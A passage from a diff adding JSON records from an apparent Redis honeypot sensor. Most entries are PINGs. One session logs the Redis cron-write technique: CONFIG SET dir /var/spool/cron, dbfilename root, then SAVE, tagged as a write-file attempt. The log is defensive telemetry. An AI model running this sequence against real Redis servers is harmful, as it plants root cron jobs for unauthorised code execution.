+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "analysis_hint": "redis_write_file_attempt",
+        "arg_count": "3",
+        "args_sha256": "331319947cc1dc4d7a5d0c0f9435c6e7bc353ba31a42c75936c23c3b7957359e",
+        "args_text": "SET dir /var/spool/cron",
+        "args_truncated": "False",
+        "client_id": "2",
+        "close_after_command": "False",
+        "command": "CONFIG",
+        "command_category": "recon",
+        "config_key": "dir",
+        "config_subcommand": "set",
+        "config_value": "/var/spool/cron",
+        "config_value_sha256": "1d776d20b63c81a21618a8318dd70a6a1d2f0c433229a1fd6ceb69a2f1ef7b6c",
+        "config_value_truncated": "False",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "5",
+        "response_class": "simple_string",
+        "session_duration": "0.000577354",
+        "session_duration_ms": "0",
+        "session_id": "5c117c2402afe738276386c0593449c8",
+        "session_start": "2026-10-30T16:14:24.529066928Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "CONFIG SET dir /var/spool/cron"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43416",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "analysis_hint": "redis_write_file_attempt",
+        "arg_count": "3",
+        "args_sha256": "e8f095f946863d2112b3851c1e3476a09de92a0fe23fcc04e01f6aa5c32affef",
+        "args_text": "SET dbfilename root",
+        "args_truncated": "False",
+        "client_id": "2",
+        "close_after_command": "False",
+        "command": "CONFIG",
+        "command_category": "recon",
+        "config_key": "dbfilename",
+        "config_subcommand": "set",
+        "config_value": "root",
+        "config_value_sha256": "4813494d137e1631bba301d5acab6e7bb7aa74ce1185d456565ef51d737677b2",
+        "config_value_truncated": "False",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "5",
+        "response_class": "simple_string",
+        "session_duration": "0.000678576",
+        "session_duration_ms": "0",
+        "session_id": "5c117c2402afe738276386c0593449c8",
+        "session_start": "2026-10-30T16:14:24.529066928Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "CONFIG SET dbfilename root"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43416",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "analysis_hint": "redis_write_file_commit",
+        "arg_count": "0",
+        "client_id": "2",
+        "close_after_command": "False",
+        "command": "SAVE",
+        "command_category": "persistence",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "5",
+        "response_class": "simple_string",
+        "session_duration": "0.000838341",
+        "session_duration_ms": "0",
+        "session_id": "5c117c2402afe738276386c0593449c8",
+        "session_start": "2026-10-30T16:14:24.529066928Z",
+        "target_dbfilename": "root",
+        "target_dir": "/var/spool/cron",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "SAVE"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43416",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "10",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "3.0751e-05",
+        "session_duration_ms": "0",
+        "session_id": "44854e54e9c9a106e12a95fb24859c77",
+        "session_start": "2026-10-30T16:17:33.452326362Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "39570",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:17:33",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "10",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "3.4102e-05",
+        "session_duration_ms": "0",
+        "session_id": "a0db740f549109f66ef2f2d0e42ef3d6",
+        "session_start": "2026-10-30T16:14:24.531786813Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43506",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "11",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "5.1257e-05",
+        "session_duration_ms": "0",
+        "session_id": "c832819e2d9357f448c36bc58636335e",
+        "session_start": "2026-10-30T16:14:24.5319273Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43522",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "11",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "5.3375e-05",
+        "session_duration_ms": "0",
+        "session_id": "08ac9cc19acae7d2cc82b5268fe6a591",
+        "session_start": "2026-10-30T16:17:33.452580863Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "39586",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:17:33",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "12",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "0.006423761",
+        "session_duration_ms": "6",
+        "session_id": "9388ba96cbf411a2822b3450233d4184",
+        "session_start": "2026-10-30T16:14:24.532130577Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43530",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "12",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "2.4708e-05",
+        "session_duration_ms": "0",
+        "session_id": "4294b977ea76753e272d233c5d6d8258",
+        "session_start": "2026-10-30T16:17:33.453326785Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "39590",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:17:33",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "13",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "2.475e-05",
+        "session_duration_ms": "0",
+        "session_id": "948751183281c0a565a872abbfc9769d",
+        "session_start": "2026-10-30T16:17:33.454393376Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "39604",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:17:33",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "13",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "5.3089e-05",
+        "session_duration_ms": "0",
+        "session_id": "8a2fed08c1e0141aafbd4876b1d77d21",
+        "session_start": "2026-10-30T16:14:24.53876357Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43536",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "14",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "3.0792e-05",
+        "session_duration_ms": "0",
+        "session_id": "3276824390642505ed13b8c1e1c1d6e3",
+        "session_start": "2026-10-30T16:17:33.455383507Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "39620",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:17:33",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "14",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "3.8016e-05",
+        "session_duration_ms": "0",
+        "session_id": "261c6fc6d55d3e5f9756f925a60917e8",
+        "session_start": "2026-10-30T16:14:24.538996702Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43552",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "15",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "6.6121e-05",
+        "session_duration_ms": "0",
+        "session_id": "f9ab34695fab11649c9aa60942a0d32b",
+        "session_start": "2026-10-30T16:14:24.539154344Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43562",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "15",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "6.625e-05",
+        "session_duration_ms": "0",
+        "session_id": "d96597aef85371b85caff7acc347265f",
+        "session_start": "2026-10-30T16:17:33.45623718Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "39624",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:17:33",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "16",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "5.1376e-05",
+        "session_duration_ms": "0",
+        "session_id": "0721d8bbf5af9bb30769ecdd02d211e4",
+        "session_start": "2026-10-30T16:17:33.45652439Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "39632",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:17:33",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "16",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "5.2922e-05",
+        "session_duration_ms": "0",
+        "session_id": "e7784e27ba9c28f4c61903c848ed7cec",
+        "session_start": "2026-10-30T16:14:24.539352125Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43572",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "17",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "4.6759e-05",
+        "session_duration_ms": "0",
+        "session_id": "9f81934513656e359e07aabf39bb53ec",
+        "session_start": "2026-10-30T16:14:24.539548574Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43588",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "17",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "6.6875e-05",
+        "session_duration_ms": "0",
+        "session_id": "ded2fc719466553939033d2e4cca9273",
+        "session_start": "2026-10-30T16:17:33.457327979Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "39648",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:17:33",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "18",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "2.9438e-05",
+        "session_duration_ms": "0",
+        "session_id": "25da59987ad846d437b784e11180d133",
+        "session_start": "2026-10-30T16:14:24.539723912Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43590",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "2",
+        "client_name": "nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn",
+        "client_name_truncated": "True",
+        "close_after_command": "True",
+        "command": "QUIT",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "5",
+        "response_class": "simple_string",
+        "session_duration": "0.001077761",
+        "session_duration_ms": "1",
+        "session_id": "5c117c2402afe738276386c0593449c8",
+        "session_start": "2026-10-30T16:14:24.529066928Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "QUIT"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43416",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "2",
+        "close_after_command": "False",
+        "command": "INFO",
+        "command_category": "recon",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "5500",
+        "response_class": "bulk_string",
+        "session_duration": "0.000251744",
+        "session_duration_ms": "0",
+        "session_id": "5c117c2402afe738276386c0593449c8",
+        "session_start": "2026-10-30T16:14:24.529066928Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "INFO"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43416",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "2",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "0.000156934",
+        "session_duration_ms": "0",
+        "session_id": "5c117c2402afe738276386c0593449c8",
+        "session_start": "2026-10-30T16:14:24.529066928Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43416",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "2",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "8.2084e-05",
+        "session_duration_ms": "0",
+        "session_id": "de61bf9740b37294bc92802c4f071ac4",
+        "session_start": "2026-10-30T16:17:33.442384586Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "39504",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:17:33",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "3",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "5.1667e-05",
+        "session_duration_ms": "0",
+        "session_id": "9f7e1c61c797048df3bae383dc72a56a",
+        "session_start": "2026-10-30T16:17:33.444341349Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "39512",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:17:33",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "3",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "5.5586e-05",
+        "session_duration_ms": "0",
+        "session_id": "cff5593cd270efc957ccd652c96d5b52",
+        "session_start": "2026-10-30T16:14:24.530367203Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43426",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "4",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "0.000407294",
+        "session_duration_ms": "0",
+        "session_id": "f18bf208b473a13495f6dbb4aab8dd7f",
+        "session_start": "2026-10-30T16:17:33.444901145Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "39514",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:17:33",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "4",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "9.0604e-05",
+        "session_duration_ms": "0",
+        "session_id": "230c01142b9d65cf02297130f618f7cc",
+        "session_start": "2026-10-30T16:14:24.530567607Z",
